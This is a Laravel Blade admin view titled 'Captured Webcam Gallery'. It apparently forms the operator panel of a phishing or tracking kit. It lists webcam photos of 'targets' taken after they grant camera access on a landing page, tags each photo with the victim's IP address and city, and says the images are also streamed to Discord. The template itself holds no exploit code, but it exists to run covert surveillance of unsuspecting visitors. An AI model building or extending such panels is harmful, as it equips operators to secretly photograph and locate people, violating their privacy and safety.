@extends('layouts.admin')

@section('title', 'Webcam Captures')

@section('content')
<div class="space-y-6 max-w-7xl mx-auto">

    <!-- Header -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
            <h1 class="text-xl sm:text-2xl font-bold text-white tracking-tight">Captured Webcam Gallery</h1>
            <p class="text-zinc-400 text-xs sm:text-sm mt-0.5">Real-time target photos captured through browser camera stream.</p>
        </div>
        <div class="text-xs text-zinc-500 font-mono">
            Total Photos: {{ $snapshots->total() }}
        </div>
    </div>

    @if($snapshots->isEmpty())
        <div class="rounded-2xl bg-zinc-900 border border-zinc-800 p-12 sm:p-16 text-center text-zinc-500">
            <i class="fa-solid fa-camera-retro text-4xl sm:text-5xl mb-3 opacity-30"></i>
            <h3 class="text-base sm:text-lg font-medium text-zinc-400">No photos captured yet</h3>
            <p class="text-xs text-zinc-500 mt-1 max-w-sm mx-auto">When a target grants camera permissions on the landing page, photos will stream here and to Discord.</p>
        </div>
    @else
        <!-- Responsive Grid -->
        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-2.5 sm:gap-4">
            @foreach($snapshots as $snap)
                <div class="group bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden shadow-lg hover:border-pink-500/50 transition duration-200 flex flex-col justify-between">
                    <div class="aspect-video bg-black relative overflow-hidden cursor-pointer" onclick="openPhotoPreview('{{ $snap->url }}', '{{ $snap->visitorLog->ip ?? 'Unknown IP' }}', '{{ $snap->created_at->format('M d, Y H:i:s') }}')">
                        <img src="{{ $snap->url }}" 
                             alt="Snapshot" 
                             loading="lazy"
                             class="w-full h-full object-cover group-hover:scale-105 transition duration-300">
                        <div class="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 flex items-center justify-center text-white transition">
                            <i class="fa-solid fa-expand text-base"></i>
                        </div>
                    </div>
                    <div class="p-2 sm:p-2.5 text-[10px] sm:text-[11px] font-mono text-zinc-400 space-y-0.5 bg-zinc-950/40 border-t border-zinc-850">
                        <div class="text-zinc-200 font-bold truncate">
                            {{ $snap->visitorLog->ip ?? 'Unknown IP' }}
                        </div>
                        <div class="text-[9px] sm:text-[10px] text-zinc-500 truncate">
                            {{ $snap->visitorLog->city ?? 'Unknown' }}
                        </div>
                        <div class="text-[9px] sm:text-[10px] text-zinc-500">
                            {{ $snap->created_at->format('M d, H:i') }}
                        </div>
                    </div>
                </div>
            @endforeach
        </div>

        @if($snapshots->hasPages())
            <div class="pt-4">
                {{ $snapshots->links() }}
            </div>
        @endif
    @endif

</div>

<!-- Photo Lightbox Modal for Mobile & Desktop -->
<div id="photoModal" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-md hidden items-center justify-center p-3 sm:p-6" onclick="closePhotoPreview()">
    <div class="relative max-w-3xl w-full bg-zinc-900 border border-zinc-800 rounded-2xl overflow-hidden shadow-2xl space-y-3 p-4" onclick="event.stopPropagation()">
        <div class="flex items-center justify-between border-b border-zinc-800 pb-2.5">
            <div>
                <h4 id="previewIp" class="text-sm font-bold text-white font-mono">Target IP</h4>
                <p id="previewTime" class="text-[10px] text-zinc-500 font-mono">Time</p>
            </div>
            <button onclick="closePhotoPreview()" class="w-8 h-8 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-400 hover:text-white flex items-center justify-center transition">
                <i class="fa-solid fa-xmark text-sm"></i>
            </button>
        </div>

        <div class="rounded-xl overflow-hidden bg-black flex items-center justify-center max-h-[70vh]">
            <img id="previewImg" src="" alt="Full size preview" class="max-h-[65vh] w-auto object-contain rounded-lg">
        </div>

        <div class="flex justify-end pt-1">
            <a id="previewDownload" href="" target="_blank" class="px-4 py-2 bg-pink-600 hover:bg-pink-500 text-white rounded-xl text-xs font-medium transition flex items-center gap-1.5 shadow-lg shadow-pink-600/20">
                <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i> Open Original
            </a>
        </div>
    </div>
</div>

@endsection

@section('scripts')
<script>
function openPhotoPreview(url, ip, time) {
    const modal = document.getElementById('photoModal');
    document.getElementById('previewImg').src = url;
    document.getElementById('previewIp').innerText = ip;
    document.getElementById('previewTime').innerText = time;
    document.getElementById('previewDownload').href = url;

    modal.classList.remove('hidden');
    modal.classList.add('flex');
}

function closePhotoPreview() {
    const modal = document.getElementById('photoModal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
}
</script>
@endsection
